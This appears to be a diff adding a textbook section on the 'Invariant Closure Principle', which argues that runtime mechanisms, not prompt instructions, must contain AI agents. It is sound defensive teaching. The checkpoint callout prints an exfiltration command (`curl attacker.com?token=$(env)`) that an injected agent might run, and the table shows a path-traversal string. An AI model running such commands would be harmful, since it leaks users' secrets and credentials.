@@ -1,0 +1,134 @@
+## The Invariant Closure Principle {#sec-vol3-intro-invariant-closure}
+
+Treating safety, resource bounds, or data isolation as advisory prompt directives delegated to an unprivileged neural policy creates an immediate architectural vulnerability. When a host runtime instructs an autoregressive model $\pi_\theta$ to "refrain from reading unauthorized files" or "limit tool invocations to at most ten calls," the runtime confuses a statistical suggestion with an execution invariant. The foundation model's autoregressive decode loop samples tokens from a learned vocabulary distribution $P(x_t \mid x_{<t}; \theta)$; it possesses neither a hardware protection ring, a memory management unit, nor an internal execution trap. An adversarial context injection, an out-of-distribution observation from an external tool, or a stochastic sample drawn from the distribution tail can override conversational instructions, producing a candidate action $a_{\text{prop}}$ that violates the system designer's operational intent.
+
+**The Invariant Closure Principle establishes that non-negotiable system invariants must never depend on the voluntary compliance of a stochastic foundation model. System safety, resource isolation, and syntactic validity must be mechanically enforced by the host runtime below the model, while semantic task success must be validated by deterministic, end-to-end verification above it.**
+
+To build dependable computing systems around unprivileged, non-deterministic predictors, we must draw an absolute boundary between what can be mechanically constrained by the supervisory runtime and what must be empirically verified through operational evidence. 
+
+::: {.column-margin}
+The Invariant Closure Principle is the agentic realization of the principle of least privilege: an unprivileged neural core operates under zero ambient authority ($A=0$), holding candidate actions in memory escrow until deterministic runtime gatekeepers validate them.
+:::
+
+### The Dual Guarantees of the End-to-End Boundary
+
+In their seminal 1984 treatise on systems architecture, Jerome H. Saltzer, David P. Reed, and David D. Clark articulated the *End-to-End Argument in System Design*: functions placed at low levels of a system may frequently be redundant or of little value compared to providing the same function at the endpoints of the communication system. In an agentic architecture, this classical principle bifurcates into two complementary systems guarantees: lower-layer mechanical closure and upper-layer semantic verification.
+
+::: {.column-margin}
+> "The function in question can completely and correctly be specified and implemented only with the help of the knowledge and help of the application standing at the endpoints of the communication system."  
+> — Jerome H. Saltzer, David P. Reed, & David D. Clark (1984)
+:::
+
+Lower runtime layers can easily enforce bounded physical properties—such as preventing a child process from issuing network sockets, bounding memory allocation to 2 gigabytes, or terminating execution after thirty seconds. These low-level mechanisms are indispensable because they guarantee physical containment: no matter what token sequence the neural policy $\pi_\theta$ emits, the host environment cannot be compromised beyond the declared sandbox boundary. However, the lower layers cannot certify that the application's ultimate goal has been satisfied. A Linux container runtime can guarantee that an agent did not write outside `/workspace/repo`, but it cannot determine whether the Python patch applied inside that directory fixed a race condition or introduced a subtle numerical regression.
+
+Conversely, the neural core cannot substitute for low-level mechanical enforcement. Because the foundation model operates as an unprivileged predictor under zero ambient authority ($A=0$), it cannot be granted ambient permission to execute operating system primitives based on its own promise of good behavior. If an invariant must hold under all execution paths—such as the invariant that an agent must never bill more than \$5.00 of cloud infrastructure per task—that property must be closed mechanically by the host supervisor. Functional task correctness, meanwhile, can only be established at the end-to-end application boundary by collecting concrete evidence: compiler exit codes, unit test matrices, linters, and cryptographically verified artifact hashes.
+
+### Mechanical Invariant Closure Below the Model
+
+Mechanical invariant closure treats the foundation model as an untrusted policy generator whose proposals are intercepted before they reach physical effectors. We formalize this arbitration by defining the invariant closure operator $\mathcal{I}$.
+
+Let $\mathcal{A}_{\text{prop}}$ represent the candidate action emitted by the model's autoregressive decode loop, and let $\mathcal{S}_{\text{sys}}$ denote the current physical state of the host operating environment. The host supervisor mediates all interactions via an invariant closure function:
+
+$$\mathcal{I}: \mathcal{A}_{\text{prop}} \times \mathcal{S}_{\text{sys}} \to \mathcal{A}_{\text{perm}} \cup \{\bot\}$$
+
+where $\mathcal{A}_{\text{perm}}$ is the permitted action dispatched to the execution environment, and $\bot$ represents an execution fault that aborts action dispatch and reflects a typed error record back into the model's context history $\mathcal{H}_t$.
+
+```
++-------------------------------------------------------------------+
+|               UNPRIVILEGED FOUNDATION MODEL (A = 0)               |
+|            Emits Candidate Action Proposal: a_prop                |
++-------------------------------------------------------------------+
+                                  |
+                                  v
++-------------------------------------------------------------------+
+|                DETERMINISTIC RUNTIME SUPERVISOR                   |
+|                                                                   |
+|   [Invariant Closure Operator: I(a_prop, S_sys) -> a_perm | _|_]  |
+|                                                                   |
+|   1. Lexical/Syntactic Gate  : Context-Free Schema Validation     |
+|   2. Resource Accounting     : Token Buckets & Step Limits (T_max)|
+|   3. Boundary Mediation      : Filesystem Scopes & Network Policy |
++-------------------------------------------------------------------+
+             |                                       |
+    (Passes Invariants)                      (Violates Invariant)
+             |                                       |
+             v                                       v
++-------------------------+             +---------------------------+
+|    ISOLATED EFFECTOR    |             |       ESCROW FAULT        |
+| Executed inside sandbox |             |  Action aborted; typed    |
+| (Filesystem, Shell, RPC)|             |  diagnostic appended to H |
++-------------------------+             +---------------------------+
+```
+
+::: {#pri-invariant-closure .callout-principle title="The Invariant Closure Principle"}
+Constraints the system must enforce cannot depend on a model's compliance alone; runtime controls must mechanically close all bounded safety, resource, and isolation properties below the model, while task correctness requires empirical evidence commensurate with the claim collected at the end-to-end application boundary.
+:::
+
+When an agentic system relies on prompt-based instructions to enforce system invariants, it suffers from ambient authority leakage: the model is assumed to possess internal self-restraint. Under mechanical invariant closure, the runtime strips the model of all execution authority, establishing an enforced envelope through deterministic layers.
+
+| System Dimension | Advisory Prompt Directive (Vulnerable) | Mechanical Runtime Closure (Enforced) | Failure Mode Under Advisory Model |
+| :--- | :--- | :--- | :--- |
+| **Filesystem Access** | `"Do not modify files outside /workspace."` | Read-only bind mounts and kernel namespace boundaries. | Path traversal (`../../etc/passwd`) via relative paths or symlinks. |
+| **Execution Budget** | `"Stop your work if you exceed 10 tool steps."` | Monotonic counter decremented in host execution harness ($T \le T_{\max}$). | Infinite polling loops consuming tokens and execution credits. |
+| **Tool Payload Syntax** | `"Always output valid JSON conforming to the schema."` | Constrained decode masks or schema validation parser. | Broken JSON syntax halting the parser or triggering unhandled exceptions. |
+| **Network Egress** | `"Only access internal corporate documentation APIs."` | Network namespace isolation with loopback-only default routes. | Data exfiltration to untrusted external endpoints via HTTP requests. |
+| **Financial Cost** | `"Keep total inference token usage below 100k tokens."` | Hard token-bucket rate limiter and accounting supervisor. | Model spins on context-window overflow, exhausting API budget. |
+
+::: {#chk-invariant-closure .callout-checkpoint title="Prompt Guardrails vs. Kernel Namespaces"}
+Consider an autonomous coding agent tasked with upgrading a dependency in a multi-tenant environment. The system prompt contains the sentence: *"Security Notice: You must never inspect environment variables, read credentials from `/etc`, or establish outbound network connections."*
+
+Can this instruction be considered an invariant? 
+
+**Analysis:** No. This instruction is a conversational preference, not an architectural invariant. If the model encounters an obfuscated setup script that runs `curl attacker.com?token=$(env)`, an autoregressive model will parse and execute the directive if it deems it relevant to resolving the dependency tree. An invariant exists only if the host runtime drops network capabilities (`CAP_NET_ADMIN`, `CAP_NET_RAW`), unshares the network namespace, and mounts sensitive directories as unreadable before the process starts. If a malicious input can bypass a control through prompt manipulation alone, that control belongs to the stochastic layer, not the invariant layer.
+:::
+
+### The Epistemic Boundary: Enforced Envelopes Versus Semantic Correctness
+
+While the host runtime can deterministically enforce the operational boundary, it cannot determine whether an action within that boundary is semantically correct. The runtime supervisor creates an *enforced envelope*: a bounded operational space within which the unprivileged model can explore, fail, backtrack, and synthesize candidate solutions without endangering host stability or exceeding allocated budgets.
+
+The distinction between the enforced envelope and task correctness defines the epistemic boundary of agentic engineering. The host runtime enforces negative constraints (what the agent *cannot* do), but only empirical evaluation can verify positive progress (what the agent *has achieved*). 
+
+Within the enforced envelope, the agent's internal monologue and self-reported conclusions possess zero evidential weight. When an agent emits the text string:
+
+```
+"I have investigated the database contention issue and optimized the query index. 
+All latency targets are now fully met."
+```
+
+the host runtime must treat this string as an unverified assertion. In accordance with Dijkstra's empirical verification principle, program execution and external testing can demonstrate the presence of operational defects, but an agent's self-affirmation can never prove their absence. If the task contract requires query latency under 10 milliseconds, the host supervisor must demand verifiable telemetry—such as an executed benchmark harness outputting p99 latency distributions across ten thousand iterations—before transitioning the task state from active execution to verification closure.
+
+::: {#exmp-blast-radius-containment .callout-example title="Blast-Radius and Cost Containment under Fail-Plausible Loops"}
+A software engineering team deploys an autonomous debugging agent driven by a foundation model $\pi_\theta$. The agent operates with an average context size of $K = 64{,}000$ tokens per step. The API pricing structure costs $\$3.00$ per million prompt tokens and $\$15.00$ per million completion tokens. On each step, the model ingests the context and emits an average tool call completion of $L = 1{,}024$ tokens.
+
+During an automated run, the agent encounters an unhandled runtime exception in an external test harness. Because the error trace is ambiguous, the model enters a fail-plausible retry loop: on each iteration, it re-reads the codebase, makes an identical trivial modification to a comment, and re-invokes the failing test harness.
+
+**Scenario A: Advisory Termination (Model-Governed)**  
+The system prompt contains the advisory directive: *"If you cannot solve the bug after five attempts, halt and inform the user."* However, due to attention dilution over long contexts, the model loses track of its iteration count and runs unchecked until reaching an external platform timeout of 4 hours, executing $N = 450$ steps.
+
+Calculate the cost exposure and compute waste:
+$$\text{Input Cost} = 450 \times 64{,}000 \times \frac{\$3.00}{10^6} = 450 \times 0.064 \times \$3.00 = \$86.40$$
+$$\text{Output Cost} = 450 \times 1{,}024 \times \frac{\$15.00}{10^6} = 450 \times 0.001024 \times \$15.00 = \$6.91$$
+$$\text{Total Financial Waste} = \$86.40 + \$6.91 = \$93.31$$
+$$\text{Total Tokens Billed} = 450 \times (64{,}000 + 1{,}024) \approx 29.26 \times 10^6 \text{ tokens}$$
+
+**Scenario B: Mechanical Invariant Closure (Runtime-Governed)**  
+The host supervisor enforces invariant closure via two hard runtime limits:
+1. Hard Step Invariant: $T_{\max} = 25$ steps.
+2. Hard Financial Escrow: Token bucket budget capped at $C_{\max} = \$5.00$.
+
+The runtime evaluates the cost accumulator after each invocation:
+$$\text{Step Cost} = \left(64{,}000 \times \frac{\$3.00}{10^6}\right) + \left(1{,}024 \times \frac{\$15.00}{10^6}\right) = \$0.192 + \$0.01536 = \$0.20736$$
+
+At step $t = 24$, the cumulative expenditure reaches:
+$$C_{24} = 24 \times \$0.20736 = \$4.97664$$
+
+When the model emits action proposal $a_{25}$, the supervisor calculates projected cost:
+$$C_{\text{projected}} = \$4.97664 + \$0.20736 = \$5.184 > C_{\max}$$
+
+The supervisor halts execution immediately:
+$$\mathcal{I}(a_{25}, \mathcal{S}_{\text{sys}}) = \bot \quad [\texttt{FAULT\_BUDGET\_EXHAUSTED}]$$
+
+The process is terminated, the workspace diff is reverted via the write-ahead log, and the total financial expenditure is strictly bounded to $\$4.98$. Mechanical invariant closure reduces financial blast radius by $94.7\%$ and limits execution steps from 450 to 24, regardless of the model's internal confusion.
+:::
+
+To enforce invariant closure effectively, how must systems engineers specify tasks and bound their operating envelopes? If the runtime must judge whether an agent's proposed trajectory satisfies an external contract, that contract cannot exist as an ephemeral, underspecified natural language prompt. We must formalize the boundary between human intent and machine execution into a rigorous, typed contract. In Section 1.8, we formalize the Task Specification Contract, defining the explicit interfaces through which systems declare their deliverables, operational bounds, and verification criteria.
